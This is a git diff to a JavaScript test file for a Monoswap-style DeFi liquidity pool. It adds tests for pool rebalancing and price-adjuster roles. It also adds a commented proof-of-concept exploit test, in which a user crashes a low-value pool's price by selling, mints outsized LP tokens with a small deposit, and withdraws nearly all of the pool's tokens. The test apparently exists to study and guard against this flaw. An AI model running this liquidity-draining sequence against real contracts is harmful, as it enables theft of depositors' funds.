@@ -4,6 +4,7 @@ const { expectRevert, time } = require('@openzeppelin/test-helpers');
 const { deployContract, MockProvider, solidity } = require('ethereum-waffle');
 
 const Web3 = require('web3');
+const { BigNumber } = require("ethers");
 const { utils } = Web3;
 
 const e18 = 1 + '0'.repeat(18)
@@ -43,16 +44,19 @@ describe('OptionVaultPair', function () {
         this.weth = await this.WETH9.deploy();
         this.yfi = await this.MockERC20.deploy('YFI', 'YFI', e26);
         this.dai = await this.MockERC20.deploy('Dai', 'DAI', e26);
+        this.aave = await this.MockERC20.deploy('Aave','AAVE',e26); // used to test if exploit is possible at low value of the pool
         this.vusd = await this.vUSD.deploy();
 
         await this.weth.deposit({value: bigNum(100000000)})
         await this.weth.transfer(this.alice.address, bigNum(10000000))
         await this.yfi.transfer(this.alice.address, bigNum(10000000))
         await this.dai.transfer(this.alice.address, bigNum(10000000))
+        await this.aave.transfer(this.alice.address, bigNum(10000000))  //alice will initiate the pool
 
         await this.weth.transfer( this.bob.address, bigNum(10000000))
         await this.yfi.transfer( this.bob.address, bigNum(10000000))
         await this.dai.transfer( this.bob.address, bigNum(10000000))
+        await this.aave.transfer(this.bob.address, bigNum(10000000))  //bob will sell and take the price down
         this.monoXPool = await this.MonoXPool.deploy(this.weth.address)
         // this.pool = await this.Monoswap.deploy(this.monoXPool.address, this.vusd.address, this.weth.address)
         this.pool = await upgrades.deployProxy(this.Monoswap, [this.monoXPool.address, this.vusd.address])
@@ -65,15 +69,19 @@ describe('OptionVaultPair', function () {
         await this.weth.connect(this.alice).approve(this.pool.address, e26);
         await this.yfi.connect(this.alice).approve(this.pool.address, e26);
         await this.dai.connect(this.alice).approve(this.pool.address, e26);
+        await this.aave.connect(this.alice).approve(this.pool.address, e26);    //alice approval
+        await this.aave.approve(this.pool.address, e26);    //owner approval
         await this.vusd.connect(this.alice).approve(this.pool.address, e26);
 
         await this.weth.connect(this.bob).approve(this.pool.address, e26);
         await this.yfi.connect(this.bob).approve(this.pool.address, e26);
         await this.dai.connect(this.bob).approve(this.pool.address, e26);
         await this.vusd.connect(this.bob).approve(this.pool.address, e26);
+        await this.aave.connect(this.bob).approve(this.pool.address, e26);    //bob approval
 
         await this.pool.addOfficialToken(this.weth.address, bigNum(300))
         await this.pool.addOfficialToken(this.dai.address, bigNum(1))
+        await this.pool.addOfficialToken(this.aave.address, bigNum(100))    // aave price starts at 100
 
         await this.pool.connect(this.alice).addLiquidity(this.weth.address, 
             bigNum(500000), this.alice.address);
@@ -83,6 +91,10 @@ describe('OptionVaultPair', function () {
             );
         await this.pool.connect(this.alice).addLiquidity(this.dai.address, 
             bigNum(1000000), this.alice.address);
+
+        await this.pool.connect(this.alice).addLiquidity(this.aave.address, 
+            bigNum(1000), this.alice.address);       // 1000 aave is added by alice
+        
     })
 
 
@@ -537,5 +549,110 @@ describe('OptionVaultPair', function () {
         let poolinfo = await this.pool.pools(this.dai.address)
         assert(poolinfo.price.eq(bigNum(2)))
     })
+    it('should not remove all liquidity from the contract via exploit', async function () {
+        
+        const deadline = (await time.latest()) + 10000
+        
+        const bobAAVEBefore=await this.aave.balanceOf(this.bob.address);
+
+        //exploit begins
+        //pool has 1000 aave with 100$ price
+        //prerequisites: 2246.57 + 100 AAVE
+
+        await this.pool.connect(this.bob).swapExactTokenForETH(
+            this.aave.address, 
+            "2246570000000000000000", bigNum(2), this.bob.address, deadline)        // huge sellof so that the pool value is 0.0589351766$ after sale
+
+        const bobETHAfterSale =await ethers.provider.getBalance(this.bob.address);
+
+        const bobAaveLPBefore = (await this.pool.balanceOf(this.bob.address, 2)).toString();
+
+        await this.pool.connect(this.bob).addLiquidity(this.aave.address, 
+            bigNum(100), this.bob.address);       // 100 aave is added by bob
+
+        const bobAaveLPAfter = (await this.pool.balanceOf(this.bob.address, 2)).toString();
+
+        await this.pool.connect(this.bob).swapETHForExactToken(
+            this.aave.address, 
+            bigNum(1000),"2246570000000000000000", this.bob.address, deadline,
+            { ...overrides, value: bigNum(1000) }
+            )
+
+        console.log('liquidity before/after',bobAaveLPBefore,bobAaveLPAfter);   //we can see bob now has a huge number of lp
+
+        await this.pool.connect(this.bob).removeLiquidity(
+            this.aave.address, bobAaveLPAfter, this.bob.address, 0, 0);
+
+        const bobAAVEAfter=await this.aave.balanceOf(this.bob.address)
+
+        console.log('bob aave before/after exploit',bobAAVEBefore.toString(),bobAAVEAfter.toString());  // we can see that bob removed all (99.99%) the AAVE from the contract
+
+    });
+
+    it('should balance the liquidity properly', async function () {
+        const deadline = (await time.latest()) + 10000
+
+        //selling begins
+        //pool has 1000 aave with 100$ price
+       
+
+        await this.pool.connect(this.bob).swapExactTokenForETH(
+            this.aave.address, 
+            "2246570000000000000000", bigNum(2), this.bob.address, deadline)        // huge sellof so that the pool value is 0.0589351766$ after sale
+
+        const bobETHAfterSale =await ethers.provider.getBalance(this.bob.address);
+   
+        const poolInfo = await this.pool.getPool(this.aave.address);
+        console.log('poolinfoBefore',poolInfo.poolValue.toString(),poolInfo.vusdDebt.toString(),poolInfo.vusdCredit.toString(),poolInfo.tokenBalanceVusdValue.toString());
+        expect(poolInfo.vusdDebt.toString()).to.equal('100207967701922338036149');    // debt is 100207967701922338036149
+   
+        const aliceBalanceBeforeRebalancing=await this.aave.balanceOf(this.alice.address);
+        
+        const poolPriceBeforeRebalancing = ((await this.pool.pools(this.aave.address)).price).toString();
+
+        const poolBalanceBeforeRebalancing = ((await this.pool.pools(this.aave.address)).tokenBalance).toString();
+
+        await this.pool.rebalancePool(this.aave.address,'100207967701922338036149');
+
+        const poolInfoAfterBalance = await this.pool.getPool(this.aave.address);  
+        
+        console.log('poolinfoAfter',poolInfoAfterBalance.poolValue.toString(),poolInfoAfterBalance.vusdDebt.toString(),poolInfoAfterBalance.vusdCredit.toString(),poolInfoAfterBalance.tokenBalanceVusdValue.toString());
+
+        const poolPriceAfterRebalancing = ((await this.pool.pools(this.aave.address)).price).toString();
+
+        const poolBalanceAfterRebalancing = ((await this.pool.pools(this.aave.address)).tokenBalance).toString();
+
+        const aliceBalanceAfterRebalancing=await this.aave.balanceOf(this.alice.address);
+
+        console.log('pool price before/after',poolPriceBeforeRebalancing,poolPriceAfterRebalancing);
+
+        console.log('pool balance before/after',poolBalanceBeforeRebalancing,poolBalanceAfterRebalancing);
+
+        console.log('tokens received by owner',aliceBalanceAfterRebalancing-aliceBalanceBeforeRebalancing);
+
+        expect(poolInfoAfterBalance.vusdDebt.toString()).to.equal('0'); //we expect the new debt to be 0
+
+        expect(poolPriceAfterRebalancing).to.equal(poolPriceBeforeRebalancing);
+
+        expect(parseInt(poolInfoAfterBalance.poolValue.toString())).to.greaterThan(poolInfo.poolValue.toString() - 50);  // pool value should remain the same. There's an issue here because of the precision
+        expect(parseInt(poolInfoAfterBalance.poolValue.toString())).to.lessThan(parseInt(poolInfo.poolValue.toString()) + 50);
+    });
+
+    it('should add price adjuster and adjust price', async function () {
+
+        await this.pool.updatePoolStatus(this.aave.address,3);  //make the pool synthetic
+
+        await this.pool.addPriceAdjuster(this.bob.address);
+        expect(await this.pool.priceAdjusterRole(this.bob.address)).to.equal(true); //role granted
+
+        await this.pool.connect(this.bob).setPoolPrice(this.aave.address,"100000000000");   
+        expect(((await this.pool.pools(this.aave.address)).price).toString()).to.equal("100000000000"); //price changed
+
+        await this.pool.removePriceAdjuster(this.bob.address);      //remove role
+        expect(await this.pool.priceAdjusterRole(this.bob.address)).to.equal(false);
+
+    });
+
+
 
 });
